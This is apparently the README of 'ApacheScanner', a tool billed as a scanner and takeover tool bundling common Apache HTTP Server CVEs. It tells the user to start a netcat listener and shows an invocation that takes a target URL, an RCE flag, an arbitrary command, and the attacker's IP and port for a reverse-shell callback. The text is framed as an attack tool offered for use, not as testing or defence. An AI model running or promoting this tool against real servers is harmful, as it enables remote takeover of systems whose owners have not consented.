# ApacheScanner
Apache HTTP Server Scanner and takeover tool with all common CVE's of Apache HTTP Servers


run a netcat or whatever listener for the RCE 

To run this Script install the Required pip Modules and define your command by this: 

```python3 ApacheScanner.py -u http://serveriphere  --rce --cmd "your command here" --lhost <your attacker IP> --lport <Your listening port>``` 

```python3 ApacheScanner.py --h```  for help and see all commands
